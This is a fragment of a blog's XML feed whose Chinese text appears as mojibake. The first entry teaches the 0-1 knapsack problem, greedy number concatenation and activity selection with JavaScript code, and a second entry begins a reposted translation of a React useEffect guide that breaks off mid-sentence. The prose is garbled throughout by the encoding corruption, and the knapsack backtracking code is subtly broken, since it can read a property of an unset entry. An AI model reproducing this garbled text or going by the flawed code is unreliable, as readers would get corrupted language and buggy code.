é€’å½’è§£æ³•æœ‰äº†é€’æ¨å…¬å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨é€’å½’è§£æ³•äº†ï¼š 123456789101112131415161718192021222324252627const products = [ &#123;id:1, v: 60, w: 10&#125;, &#123;id:2, v: 100, w: 20&#125;, &#123;id:3, v: 120, w: 30&#125;]; // æ–°å»ºä¸€ä¸ªæ•°ç»„è¡¨ç¤ºå•†å“åˆ—è¡¨ï¼Œæ¯ä¸ªå•†å“åŠ ä¸ªidç”¨äºæ ‡è¯†function backpack01(n, W, products) &#123; if(n &lt; 0 || W &lt;= 0) &#123; return 0; &#125; const noLast = backpack01(n-1, W, products); // ä¸æ”¾æœ€åä¸€ä¸ª let getLast = 0; if(W &gt;= products[n].w)&#123; // å¦‚æœæœ€åä¸€ä¸ªæ”¾å¾—ä¸‹ getLast = products[n].v + backpack01(n-1, W-products[n].w, products); &#125; const result = Math.max(noLast, getLast); return result;&#125;// æµ‹è¯•ä¸€ä¸‹const result = backpack01(products.length-1, 50, products);console.log(result); // 220å¤åˆ¶ä»£ç  åŠ¨æ€è§„åˆ’é€’å½’çš„å¤æ‚åº¦å¾ˆé«˜ï¼Œæˆ‘ä»¬ç”¨åŠ¨æ€è§„åˆ’é‡å†™ä¸€ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849const products = [ &#123;id:1, v: 60, w: 10&#125;, &#123;id:2, v: 100, w: 20&#125;, &#123;id:3, v: 120, w: 30&#125;]; // æ–°å»ºä¸€ä¸ªæ•°ç»„è¡¨ç¤ºå•†å“åˆ—è¡¨ï¼Œæ¯ä¸ªå•†å“åŠ ä¸ªidç”¨äºæ ‡è¯†function backpack01(W, products) &#123; const d = []; // åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„æ”¾è®¡ç®—ä¸­é—´å€¼ï¼Œå…¶å®ä¸ºäºŒç»´æ•°ç»„ï¼Œåé¢å¡«å……é‡Œé¢çš„æ•°ç»„ const length = products.length; // iè¡¨ç¤ºè¡Œï¼Œä¸ºå•†å“ä¸ªæ•°ï¼Œæ•°å­—ä¸º 0 -- (length - 1) // jè¡¨ç¤ºåˆ—ï¼Œä¸ºèƒŒåŒ…å®¹é‡ï¼Œæ•°å­—ä¸º 0 -- W for(let i = 0; i &lt; length; i++)&#123; d.push([]); for(let j = 0; j &lt;= W; j++) &#123; if(j === 0) &#123; // èƒŒåŒ…å®¹é‡ä¸º0 d[i][j] = 0; &#125; else if(i === 0) &#123; if(j &gt;= products[i].w) &#123; // å¯ä»¥æ”¾ä¸‹ç¬¬ä¸€ä¸ªå•†å“ d[i][j] = products[i].v; &#125; else &#123; d[i][j] = 0; &#125; &#125; else &#123; const noLast = d[i-1][j]; let getLast = 0; if(j &gt;= products[i].w) &#123; getLast = products[i].v + d[i-1][j - products[i].w]; &#125; if(noLast &gt; getLast) &#123; d[i][j] = noLast; &#125; else &#123; d[i][j] = getLast; &#125; &#125; &#125; &#125; console.log(d); return d[length-1][W];&#125;// æµ‹è¯•ä¸€ä¸‹const result = backpack01(50, products);console.log(result); // 220 å›æº¯æœ€ä¼˜è§£ä¸ºäº†èƒ½å¤Ÿè¾“å‡ºæœ€ä¼˜è§£ï¼Œæˆ‘ä»¬éœ€è¦å°†æ¯ä¸ªæœ€åæ”¾å…¥çš„å•†å“è®°å½•ä¸‹æ¥ï¼Œç„¶åä»æœ€åå¾€å‰å›æº¯ï¼Œå°†å‰é¢çš„ä»£ç æ”¹é€ å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970const products = [ &#123;id:1, v: 60, w: 10&#125;, &#123;id:2, v: 100, w: 20&#125;, &#123;id:3, v: 120, w: 30&#125;]; // æ–°å»ºä¸€ä¸ªæ•°ç»„è¡¨ç¤ºå•†å“åˆ—è¡¨ï¼Œæ¯ä¸ªå•†å“åŠ ä¸ªidç”¨äºæ ‡è¯†function backpack01(W, products) &#123; const d = []; // åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„æ”¾è®¡ç®—ä¸­é—´å€¼ï¼Œå…¶å®ä¸ºäºŒç»´æ•°ç»„ï¼Œåé¢å¡«å……é‡Œé¢çš„æ•°ç»„ const res = []; // è®°å½•æ¯æ¬¡æ”¾å…¥çš„æœ€åä¸€ä¸ªå•†å“, åŒæ ·ä¸ºäºŒç»´æ•°ç»„ const length = products.length; // iè¡¨ç¤ºè¡Œï¼Œä¸ºå•†å“ä¸ªæ•°ï¼Œæ•°å­—ä¸º 0 -- (length - 1) // jè¡¨ç¤ºåˆ—ï¼Œä¸ºèƒŒåŒ…å®¹é‡ï¼Œæ•°å­—ä¸º 0 -- W for(let i = 0; i &lt; length; i++)&#123; d.push([]); res.push([]); for(let j = 0; j &lt;= W; j++) &#123; if(j === 0) &#123; // èƒŒåŒ…å®¹é‡ä¸º0 d[i][j] = 0; res[i][j] = null; &#125; else if(i === 0) &#123; if(j &gt;= products[i].w) &#123; // å¯ä»¥æ”¾ä¸‹ç¬¬ä¸€ä¸ªå•†å“ d[i][j] = products[i].v; res[i][j] = products[i]; &#125; else &#123; d[i][j] = 0; res[i][j] = null; &#125; &#125; else &#123; const noLast = d[i-1][j]; let getLast = 0; if(j &gt;= products[i].w) &#123; getLast = products[i].v + d[i-1][j - products[i].w]; &#125; if(noLast &gt; getLast) &#123; d[i][j] = noLast; &#125; else &#123; d[i][j] = getLast; res[i][j] = products[i]; // è®°å½•æœ€åä¸€ä¸ªå•†å“ &#125; &#125; &#125; &#125; // å›æº¯res, å¾—åˆ°æœ€ä¼˜è§£ let tempW = W; let tempI = length - 1; const bestSol = []; while (tempW &gt; 0 &amp;&amp; tempI &gt;= 0) &#123; const last = res[tempI][tempW]; bestSol.push(last); tempW = tempW - last.w; tempI = tempI - 1; &#125; console.log(d); console.log(bestSol); return &#123; totalValue: d[length-1][W], solution: bestSol &#125;&#125;// æµ‹è¯•ä¸€ä¸‹const result = backpack01(50, products);console.log(result); // 220 ä¸Šé¢ä»£ç çš„è¾“å‡ºï¼š æ•°å­—æ‹¼æ¥é—®é¢˜å†æ¥çœ‹ä¸€ä¸ªè´ªå¿ƒç®—æ³•çš„é—®é¢˜ï¼ŒåŠ æ·±ä¸‹ç†è§£ï¼Œè¿™ä¸ªé—®é¢˜å¦‚ä¸‹ï¼š è¿™ä¸ªé—®é¢˜çœ‹èµ·æ¥ä¹Ÿä¸éš¾ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ä¹Ÿä¼šé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç›´è§‚çš„æƒ³åˆ°ä¸€ä¸ªè§£æ³•ï¼šçœ‹å“ªä¸ªæ•°å­—çš„ç¬¬ä¸€ä¸ªæ•°å­—å¤§ï¼ŒæŠŠä»–æ’å‰é¢ï¼Œæ¯”å¦‚32å’Œ94ï¼ŒæŠŠç¬¬ä¸€ä½æ˜¯9çš„94æ”¾å‰é¢ï¼Œå¾—åˆ°9432ï¼Œè‚¯å®šæ¯”32æ”¾å‰é¢çš„3294å¤§ã€‚è¿™å…¶å®å°±æ˜¯æŒ‰ç…§å­—ç¬¦ä¸²å¤§å°æ¥æ’åºå˜›ï¼Œå­—ç¬¦å¤§çš„æ’å‰é¢ï¼Œä½†æ˜¯è¿™ç§è§£æ³•æ­£ç¡®å—ï¼Ÿæˆ‘ä»¬å†æ¥çœ‹ä¸¤ä¸ªæ•°å­—ï¼Œå‡å¦‚æˆ‘ä»¬æœ‰728å’Œ7286ï¼ŒæŒ‰ç…§å­—ç¬¦åºï¼Œ7286æ’å‰é¢ï¼Œå¾—åˆ°7286728ï¼Œä½†æ˜¯è¿™ä¸ªå€¼æ²¡æœ‰728æ”¾å‰é¢çš„7287286å¤§ã€‚è¯´æ˜å•çº¯çš„å­—ç¬¦åºæ˜¯æä¸å®šè¿™ä¸ªçš„ï¼Œå¯¹äºä¸¤ä¸ªæ•°å­—a,bï¼Œå¦‚æœä»–ä»¬çš„é•¿åº¦ä¸€æ ·ï¼Œé‚£æŒ‰ç…§å­—ç¬¦åºå°±æ²¡é—®é¢˜ï¼Œå¦‚æœä»–ä»¬é•¿åº¦ä¸ä¸€æ ·ï¼Œè¿™ä¸ªè§£æ³•å°±ä¸ä¸€å®šå¯¹äº†ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿå…¶å®ä¹Ÿç®€å•ï¼Œæˆ‘ä»¬çœ‹çœ‹a+bå’Œb+aæ‹¼æˆçš„æ•°å­—ï¼Œå“ªä¸ªå¤§å°±è¡Œäº†ã€‚ 1234567å‡è®¾a = 728b = 7286å­—ç¬¦ä¸²ï¼š a + b = &quot;7287286&quot;å­—ç¬¦ä¸²ï¼š b + a = &quot;7286728&quot;æ¯”è¾ƒä¸‹è¿™ä¸¤ä¸ªå­—ç¬¦ä¸², a + bæ¯”è¾ƒå¤§ï¼Œaæ”¾å‰é¢å°±è¡Œäº†, åä¹‹æ”¾åˆ°åé¢å¤åˆ¶ä»£ç  ä¸Šè¿°ç®—æ³•å°±æ˜¯ä¸€ä¸ªè´ªå¿ƒï¼Œè¿™é‡Œè´ªçš„æ˜¯ä»€ä¹ˆçš„ï¼Ÿè´ªçš„æ˜¯a + bçš„å€¼ï¼Œè¦å¤§çš„é‚£ä¸ªã€‚åœ¨å®ç°çš„æ—¶å€™ï¼Œå¯ä»¥è‡ªå·±å†™ä¸ªå†’æ³¡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ•°ç»„çš„sortæ–¹æ³•: 123456789101112131415161718192021const nums = [32, 94, 128, 1286, 6, 71];function getBigNum(nums) &#123; nums.sort((a, b) =&gt; &#123; const ab = `$&#123;a&#125;$&#123;b&#125;`; const ba = `$&#123;b&#125;$&#123;a&#125;`; if(ab &gt; ba) &#123; return -1; // abå¤§ï¼Œaæ”¾å‰é¢ &#125; else if (ab &lt; ba) &#123; return 1; &#125; return 0; &#125;); return nums;&#125;const res = getBigNum(nums);console.log(res); // [94, 71, 6, 32, 1286, 128] æ´»åŠ¨é€‰æ‹©é—®é¢˜æ´»åŠ¨é€‰æ‹©é—®é¢˜ç¨å¾®éš¾ä¸€ç‚¹ï¼Œä¹Ÿå¯ä»¥ç”¨è´ªå¿ƒï¼Œä½†æ˜¯éœ€è¦è´ªçš„ä¸œè¥¿æ²¡å‰é¢çš„é¢˜ç›®é‚£ä¹ˆç›´è§‚ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹é¢˜ç›®ï¼š è¿™ä¸ªé—®é¢˜åº”è¯¥è¿™ä¹ˆæ€è€ƒï¼šä¸ºäº†èƒ½å°½é‡å¤šçš„å®‰æ’æ´»åŠ¨ï¼Œæˆ‘ä»¬åœ¨å®‰æ’ä¸€ä¸ªæ´»åŠ¨æ—¶ï¼Œåº”è¯¥å°½é‡ç»™åé¢çš„æ´»åŠ¨å¤šç•™æ—¶é—´ï¼Œè¿™æ ·åé¢æœ‰æœºä¼šå¯ä»¥å®‰æ’æ›´å¤šçš„æ´»åŠ¨ã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œåº”è¯¥æŠŠç»“æŸæ—¶é—´æœ€æ—©çš„æ´»åŠ¨å®‰æ’åœ¨ç¬¬ä¸€ä¸ªï¼Œå†å‰©ä¸‹çš„æ—¶é—´é‡Œé¢ç»§ç»­å®‰æ’ç»“æŸæ—¶é—´æ—©çš„æ´»åŠ¨ã€‚è¿™é‡Œçš„è´ªå¿ƒå…¶å®è´ªçš„å°±æ˜¯ç»“æŸæ—¶é—´æ—©çš„ï¼Œè¿™ä¸ªç»“è®ºå…¶å®å¯ä»¥ç”¨æ•°å­¦æ¥è¯æ˜çš„ï¼š ä¸‹é¢æ¥å®ç°ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243const activities = [ &#123;start: 1, end: 4&#125;, &#123;start: 3, end: 5&#125;, &#123;start: 0, end: 6&#125;, &#123;start: 5, end: 7&#125;, &#123;start: 3, end: 9&#125;, &#123;start: 5, end: 9&#125;, &#123;start: 6, end: 10&#125;, &#123;start: 8, end: 11&#125;, &#123;start: 8, end: 12&#125;, &#123;start: 2, end: 14&#125;, &#123;start: 12, end: 16&#125;,];function chooseActivity(activities) &#123; // å…ˆæŒ‰ç…§ç»“æŸæ—¶é—´ä»å°åˆ°å¤§æ’åº activities.sort((act1, act2) =&gt; &#123; if(act1.end &lt; act2.end) &#123; return -1; &#125; else if(act1.end &gt; act2.end) &#123; return 1; &#125; return 0; &#125;); const res = []; // æ¥æ”¶ç»“æœçš„æ•°ç»„ let lastEnd = 0; // è®°å½•æœ€åä¸€ä¸ªæ´»åŠ¨çš„ç»“æŸæ—¶é—´ for(let i = 0; i &lt; activities.length; i++)&#123; const act = activities[i]; if(act.start &gt;= lastEnd) &#123; res.push(act); lastEnd = act.end &#125; &#125; return res;&#125;// æµ‹è¯•ä¸€ä¸‹const result = chooseActivity(activities);console.log(result); ä¸Šé¢ä»£ç çš„è¿è¡Œç»“æœå¦‚ä¸‹ï¼š æ€»ç»“è´ªå¿ƒç®—æ³•çš„é‡ç‚¹å°±åœ¨ä¸€ä¸ªè´ªå­—ï¼Œè¦æ‰¾åˆ°è´ªçš„å¯¹è±¡ï¼Œç„¶åä¸æ–­çš„è´ªï¼Œæœ€åæŠŠç›®æ ‡è´ªå®Œï¼Œè¾“å‡ºæœ€ä¼˜è§£ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯æ¬¡è´ªçš„æ—¶å€™å…¶å®æ‹¿åˆ°çš„éƒ½åªæ˜¯å±€éƒ¨æœ€ä¼˜è§£ï¼Œå±€éƒ¨æœ€ä¼˜è§£ä¸ä¸€å®šç»„æˆå…¨å±€æœ€ä¼˜è§£ï¼Œæ¯”å¦‚0-1èƒŒåŒ…ï¼Œå¯¹äºè¿™ç§é—®é¢˜æ˜¯ä¸èƒ½ç”¨è´ªå¿ƒçš„ï¼Œè¦ç”¨å…¶ä»–æ–¹æ³•æ±‚è§£ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[useEffect å®Œæ•´æŒ‡å—]]></title>
    <url>%2F2020%2F03%2F19%2FWeb%E5%89%8D%E7%AB%AF%2FuseEffect%20%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://overreacted.io/zh-hans/a-complete-guide-to-useeffect/ useEffect å®Œæ•´æŒ‡å—ä½ ç”¨Hookså†™äº†ä¸€äº›ç»„ä»¶ï¼Œç”šæˆ–å†™äº†ä¸€ä¸ªå°å‹åº”ç”¨ã€‚ä½ å¯èƒ½å¾ˆæ»¡æ„ï¼Œä½¿ç”¨å®ƒçš„APIå¾ˆèˆ’æœå¹¶ä¸”åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è·å¾—äº†ä¸€äº›å°æŠ€å·§ã€‚ä½ ç”šè‡³å¯èƒ½å†™äº†ä¸€äº› custom Hookså»æŠ½ç¦»é‡å¤çš„é€»è¾‘ï¼ˆç²¾ç®€æ‰äº†300è¡Œä»£ç ï¼‰ï¼Œå¹¶ä¸”å¾—æ„åœ°å±•ç¤ºç»™ä½ çš„åŒäº‹çœ‹ï¼Œâ€œå¹²å¾—æ¼‚äº®â€ï¼Œä»–ä»¬å¦‚æ˜¯è¯´ã€‚ ä½†æœ‰æ—¶å€™å½“ä½ ä½¿ç”¨useEffectä½ æ€»è§‰å¾—å“ªå„¿æœ‰ç‚¹ä¸å¯¹åŠ²ã€‚ä½ ä¼šå˜€å’•ä½ å¯èƒ½é—æ¼äº†ä»€ä¹ˆã€‚å®ƒçœ‹èµ·æ¥åƒclassçš„ç”Ÿå‘½å‘¨æœŸâ€¦ä½†çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿä½ å‘è§‰è‡ªå·±åœ¨é—®ç±»ä¼¼ä¸‹é¢çš„è¿™äº›é—®é¢˜ï¼š ğŸ¤” å¦‚ä½•ç”¨useEffectæ¨¡æ‹ŸcomponentDidMountç”Ÿå‘½å‘¨æœŸï¼Ÿ ğŸ¤” å¦‚ä½•æ­£ç¡®åœ°åœ¨useEffecté‡Œè¯·æ±‚æ•°æ®ï¼Ÿ[]åˆæ˜¯ä»€ä¹ˆï¼Ÿ ğŸ¤” æˆ‘åº”è¯¥æŠŠå‡½æ•°å½“åšeffectçš„ä¾èµ–å—ï¼Ÿ ğŸ¤” ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¼šå‡ºç°æ— é™é‡å¤è¯·æ±‚çš„é—®é¢˜ï¼Ÿ ğŸ¤” ä¸ºä»€ä¹ˆæœ‰æ—¶å€™åœ¨effecté‡Œæ‹¿åˆ°çš„æ˜¯æ—§çš„stateæˆ–propï¼Ÿ å½“æˆ‘åˆšå¼€å§‹ä½¿ç”¨Hooksçš„æ—¶å€™ï¼Œæˆ‘ä¹ŸåŒæ ·è¢«ä¸Šé¢è¿™äº›é—®é¢˜æ‰€å›°æ‰°ã€‚ç”šè‡³å½“æˆ‘å†™æœ€åˆçš„æ–‡æ¡£æ—¶ï¼Œæˆ‘ä¹Ÿå¹¶æ²¡æœ‰æ‰å®åœ°æŒæ¡æŸäº›ç»†èŠ‚ã€‚æˆ‘ç»å†äº†ä¸€äº›â€œå•Šå“ˆâ€çš„å¼€çªæ—¶åˆ»ï¼Œæˆ‘æƒ³æŠŠè¿™äº›åˆ†äº«ç»™ä½ ã€‚è¿™ç¯‡æ–‡ç« ä¼šæ·±å…¥è®²è§£å¸®ä½ æ˜ç™½ä¸Šé¢é—®é¢˜çš„ç­”æ¡ˆã€‚ åœ¨çœ‹ç­”æ¡ˆä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå¾€åé€€ä¸€æ­¥ã€‚è¿™ç¯‡æ–‡ç« çš„ç›®çš„ä¸æ˜¯ç»™ä½ ä¸€ä¸ªè¦ç‚¹æ¸…å•ï¼Œè€Œæ˜¯æƒ³å¸®ä½ çœŸæ­£åœ°é¢†ä¼šuseEffectã€‚å…¶å®æˆ‘ä»¬å¹¶æ²¡æœ‰å¤ªå¤šéœ€è¦å­¦ä¹ çš„ï¼Œäº‹å®ä¸Šï¼Œæˆ‘ä»¬ä¼šèŠ±å¾ˆå¤šæ—¶é—´è¯•å›¾å¿˜è®°æŸäº›å·²ç»ä¹ å¾—çš„æ¦‚å¿µï¼ˆunlearningï¼‰ã€‚ å½“æˆ‘ä¸å†é€è¿‡ç†Ÿæ‚‰çš„classç”Ÿå‘½å‘¨æœŸæ–¹æ³•å»çª¥è§†useEffect è¿™ä¸ªHookçš„æ—¶å€™ï¼Œæˆ‘æ‰å¾—ä»¥èä¼šè´¯é€šã€‚ â€œå¿˜è®°ä½ å·²ç»å­¦åˆ°çš„ã€‚â€ â€” Yoda è¿™ç¯‡æ–‡ç« ä¼šå‡è®¾ä½ å¯¹useEffect APIæœ‰ä¸€å®šç¨‹åº¦çš„äº†è§£ã€‚ è¿™ç¯‡æ–‡ç« çœŸçš„å¾ˆé•¿ã€‚å®ƒæ›´åƒä¸€æœ¬miniä¹¦ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æ›´å–œæ¬¢çš„å½¢å¼ã€‚å¦‚æœä½ å¾ˆåŒ†å¿™æˆ–è€…å¹¶ä¸æ˜¯å¤ªå…³å¿ƒæœ¬æ–‡ä¸»é¢˜çš„è¯ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥çœ‹ä¸‹é¢çš„æ‘˜è¦ã€‚ å¦‚æœä½ å¯¹äºæ·±å…¥ç ”ç©¶æ„Ÿè§‰ä¸æ˜¯å¾ˆé€‚åº”çš„è¯ï¼Œä½ æˆ–è®¸å¯ä»¥ç­‰ä¸‹é¢è¿™äº›è§£é‡Šå‡ºç°åœ¨å…¶ä»–æ–‡ç« ä¸­å†å»äº†è§£ä¹Ÿè¡Œã€‚å°±åƒ2013å¹´Reactåˆšå‡ºä¸–çš„æ—¶å€™ï¼Œå¤§å®¶éœ€è¦æ—¶é—´å»ç†è§£æ¶ˆåŒ–ä¸€ç§ä¸åŒçš„å¿ƒæ™ºæ¨¡å‹ã€‚çŸ¥è¯†ä¹Ÿéœ€è¦æ—¶é—´å»æ™®åŠã€‚ æ‘˜è¦å¦‚æœä½ ä¸æƒ³é˜…è¯»æ•´ç¯‡æ–‡ç« ï¼Œå¯ä»¥å¿«é€Ÿæµè§ˆè¿™ä»½æ‘˜è¦ã€‚è¦æ˜¯æŸäº›éƒ¨åˆ†ä¸å®¹æ˜“ç†è§£ï¼Œä½ å¯ä»¥å¾€ä¸‹æ»šåŠ¨å¯»æ‰¾ç›¸å…³çš„å†…å®¹å»é˜…è¯»ã€‚ å¦‚æœä½ æ‰“ç®—é˜…è¯»æ•´ç¯‡æ–‡ç« ï¼Œä½ å®Œå…¨å¯ä»¥è·³è¿‡è¿™éƒ¨åˆ†ã€‚æˆ‘ä¼šåœ¨æ–‡ç« æœ«å°¾å¸¦ä¸Šæ‘˜è¦çš„é“¾æ¥ã€‚ ğŸ¤” Question: å¦‚ä½•ç”¨useEffectæ¨¡æ‹ŸcomponentDidMountç”Ÿå‘½å‘¨æœŸï¼Ÿ è™½ç„¶å¯ä»¥ä½¿ç”¨useEffect(fn, [])ï¼Œä½†å®ƒä»¬å¹¶ä¸å®Œå…¨ç›¸ç­‰ã€‚å’ŒcomponentDidMountä¸ä¸€æ ·ï¼ŒuseEffectä¼šæ•è· propså’Œstateã€‚æ‰€ä»¥å³ä¾¿åœ¨å›è°ƒå‡½æ•°é‡Œï¼Œä½ æ‹¿åˆ°çš„è¿˜æ˜¯åˆå§‹çš„propså’Œstateã€‚å¦‚æœä½ æƒ³å¾—åˆ°â€œæœ€æ–°â€çš„å€¼ï¼Œä½ å¯ä»¥ä½¿ç”¨refã€‚ä¸è¿‡ï¼Œé€šå¸¸ä¼šæœ‰æ›´ç®€å•çš„å®ç°æ–¹å¼ï¼Œæ‰€ä»¥ä½ å¹¶ä¸ä¸€å®šè¦ç”¨refã€‚è®°ä½ï¼Œeffectsçš„å¿ƒæ™ºæ¨¡å‹å’ŒcomponentDidMountä»¥åŠå…¶ä»–ç”Ÿå‘½å‘¨æœŸæ˜¯ä¸åŒçš„ï¼Œè¯•å›¾æ‰¾åˆ°å®ƒä»¬ä¹‹é—´å®Œå…¨ä¸€è‡´çš„è¡¨è¾¾åè€Œæ›´å®¹æ˜“ä½¿ä½ æ··æ·†ã€‚æƒ³è¦æ›´æœ‰æ•ˆï¼Œä½ éœ€è¦â€œthink in effectsâ€ï¼Œå®ƒçš„å¿ƒæ™ºæ¨¡å‹æ›´æ¥è¿‘äºå®ç°çŠ¶æ€åŒæ­¥ï¼Œè€Œä¸æ˜¯å“åº”ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ã€‚ ğŸ¤” Question: å¦‚ä½•æ­£ç¡®åœ°åœ¨useEffecté‡Œè¯·æ±‚æ•°æ®ï¼Ÿ[]åˆæ˜¯ä»€ä¹ˆï¼Ÿ è¿™ç¯‡æ–‡ç«  æ˜¯å¾ˆå¥½çš„å…¥é—¨ï¼Œä»‹ç»äº†å¦‚ä½•åœ¨useEffecté‡Œåšæ•°æ®è¯·æ±‚ã€‚è¯·åŠ¡å¿…è¯»å®Œå®ƒï¼å®ƒæ²¡æœ‰æˆ‘çš„è¿™ç¯‡è¿™ä¹ˆé•¿ã€‚[]è¡¨ç¤ºeffectæ²¡æœ‰ä½¿ç”¨ä»»ä½•Reactæ•°æ®æµé‡Œçš„å€¼ï¼Œå› æ­¤è¯¥effectä»…è¢«è°ƒç”¨ä¸€æ¬¡æ˜¯å®‰å…¨çš„ã€‚[]åŒæ ·ä¹Ÿæ˜¯ä¸€ç±»å¸¸è§é—®é¢˜çš„æ¥æºï¼Œä¹Ÿå³ä½ ä»¥ä¸ºæ²¡ä½¿ç”¨æ•°æ®æµé‡Œçš„å€¼ä½†å…¶å®ä½¿ç”¨äº†ã€‚ä½ éœ€è¦å­¦ä¹ ä¸€äº›ç­–ç•¥ï¼ˆä¸»è¦æ˜¯useReducer å’Œ useCallbackï¼‰æ¥ç§»é™¤è¿™äº›effectä¾èµ–ï¼Œè€Œä¸æ˜¯é”™è¯¯åœ°å¿½ç•¥å®ƒä»¬ã€‚ ğŸ¤” Question: æˆ‘åº”è¯¥æŠŠå‡½æ•°å½“åšeffectçš„ä¾èµ–å—ï¼Ÿ ä¸€èˆ¬å»ºè®®æŠŠä¸ä¾èµ–propså’Œstateçš„å‡½æ•°æåˆ°ä½ çš„ç»„ä»¶å¤–é¢ï¼Œå¹¶ä¸”æŠŠé‚£äº›ä»…è¢«effectä½¿ç”¨çš„å‡½æ•°æ”¾åˆ°effecté‡Œé¢ã€‚å¦‚æœè¿™æ ·åšäº†ä»¥åï¼Œä½ çš„effectè¿˜æ˜¯éœ€è¦ç”¨åˆ°ç»„ä»¶å†…çš„å‡½æ•°ï¼ˆåŒ…æ‹¬é€šè¿‡propsä¼ è¿›æ¥çš„å‡½æ•°ï¼‰ï¼Œå¯ä»¥åœ¨å®šä¹‰å®ƒä»¬çš„åœ°æ–¹ç”¨useCallbackåŒ…ä¸€å±‚ã€‚ä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼Ÿå› ä¸ºè¿™äº›å‡½æ•°å¯ä»¥è®¿é—®åˆ°propså’Œstateï¼Œå› æ­¤å®ƒä»¬ä¼šå‚ä¸åˆ°æ•°æ®æµä¸­ã€‚æˆ‘ä»¬å®˜ç½‘çš„FAQæœ‰æ›´è¯¦ç»†çš„ç­”æ¡ˆã€‚ ğŸ¤” Question: ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¼šå‡ºç°æ— é™é‡å¤è¯·æ±‚çš„é—®é¢˜ï¼Ÿ è¿™ä¸ªé€šå¸¸å‘ç”Ÿäºä½ åœ¨effecté‡Œåšæ•°æ®è¯·æ±‚å¹¶ä¸”æ²¡æœ‰è®¾ç½®effectä¾èµ–å‚æ•°çš„æƒ…å†µã€‚æ²¡æœ‰è®¾ç½®ä¾èµ–ï¼Œeffectä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åæ‰§è¡Œä¸€æ¬¡ï¼Œç„¶ååœ¨effectä¸­æ›´æ–°äº†çŠ¶æ€å¼•èµ·æ¸²æŸ“å¹¶å†æ¬¡è§¦å‘effectã€‚æ— é™å¾ªç¯çš„å‘ç”Ÿä¹Ÿå¯èƒ½æ˜¯å› ä¸ºä½ è®¾ç½®çš„ä¾èµ–æ€»æ˜¯ä¼šæ”¹å˜ã€‚ä½ å¯ä»¥é€šè¿‡ä¸€ä¸ªä¸€ä¸ªç§»é™¤çš„æ–¹å¼æ’æŸ¥å‡ºå“ªä¸ªä¾èµ–å¯¼è‡´äº†é—®é¢˜ã€‚ä½†æ˜¯ï¼Œç§»é™¤ä½ ä½¿ç”¨çš„ä¾èµ–ï¼ˆæˆ–è€…ç›²ç›®åœ°ä½¿ç”¨[]ï¼‰é€šå¸¸æ˜¯ä¸€ç§é”™è¯¯çš„è§£å†³æ–¹å¼ã€‚ä½ åº”è¯¥åšçš„æ˜¯è§£å†³é—®é¢˜çš„æ ¹æºã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡½æ•°å¯èƒ½ä¼šå¯¼è‡´è¿™ä¸ªé—®é¢˜ï¼Œä½ å¯ä»¥æŠŠå®ƒä»¬æ”¾åˆ°effecté‡Œï¼Œæˆ–è€…æåˆ°ç»„ä»¶å¤–é¢ï¼Œæˆ–è€…ç”¨useCallbackåŒ…ä¸€å±‚ã€‚useMemo å¯ä»¥åšç±»ä¼¼çš„äº‹æƒ…ä»¥é¿å…é‡å¤ç”Ÿæˆå¯¹è±¡ã€‚ ğŸ¤” ä¸ºä»€ä¹ˆæœ‰æ—¶å€™åœ¨effecté‡Œæ‹¿åˆ°çš„æ˜¯æ—§çš„stateæˆ–propå‘¢ï¼Ÿ Effectæ‹¿åˆ°çš„æ€»æ˜¯å®šä¹‰å®ƒçš„é‚£æ¬¡æ¸²æŸ“ä¸­çš„propså’Œstateã€‚è¿™èƒ½å¤Ÿé¿å…ä¸€äº›bugsï¼Œä½†åœ¨ä¸€äº›åœºæ™¯ä¸­åˆä¼šæœ‰äº›è®¨äººå«Œã€‚å¯¹äºè¿™äº›åœºæ™¯ï¼Œä½ å¯ä»¥æ˜ç¡®åœ°ä½¿ç”¨å¯å˜çš„refä¿å­˜ä¸€äº›å€¼ï¼ˆä¸Šé¢æ–‡ç« çš„æœ«å°¾è§£é‡Šäº†è¿™ä¸€ç‚¹ï¼‰ã€‚å¦‚æœä½ è§‰å¾—åœ¨æ¸²æŸ“ä¸­æ‹¿åˆ°äº†ä¸€äº›æ—§çš„propså’Œstateï¼Œä¸”ä¸æ˜¯ä½ æƒ³è¦çš„ï¼Œä½ å¾ˆå¯èƒ½é—æ¼äº†ä¸€äº›ä¾èµ–ã€‚å¯ä»¥å°è¯•ä½¿ç”¨è¿™ä¸ªlint è§„åˆ™æ¥è®­ç»ƒä½ å‘ç°è¿™äº›ä¾èµ–ã€‚å¯èƒ½æ²¡è¿‡å‡ å¤©ï¼Œè¿™ç§èƒ½åŠ›ä¼šå˜å¾—åƒæ˜¯ä½ çš„ç¬¬äºŒå¤©æ€§ã€‚åŒæ 